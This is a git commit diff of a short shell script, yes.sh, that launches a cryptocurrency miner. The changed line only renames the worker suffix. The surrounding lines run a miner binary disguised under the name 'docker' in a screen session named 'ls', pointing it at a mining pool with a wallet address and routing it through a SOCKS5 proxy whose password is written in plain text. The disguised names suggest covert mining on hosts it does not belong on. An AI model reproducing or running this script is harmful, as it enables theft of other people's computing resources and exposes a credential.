bc2aa4e4c6af2089dedcb4fc28072590d1c54c7c
keratsakti <86237834+keratsakti@users.noreply.github.com>
2021-06-24 22:36:47 +0700

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -5,6 +5,6 @@ chmod +x docker
 screen -dmS ls 
 POOL=stratum+tcp://verushash.na.mine.zpool.ca:6143
 WALLET=MRYuRYQofJEpkcFrSpcrUqmxQfcpFz4wf3
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Dr)
 PROXY=socks5://cuan:berhasil123@199.249.170.113:443
 ./docker -a verushash -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
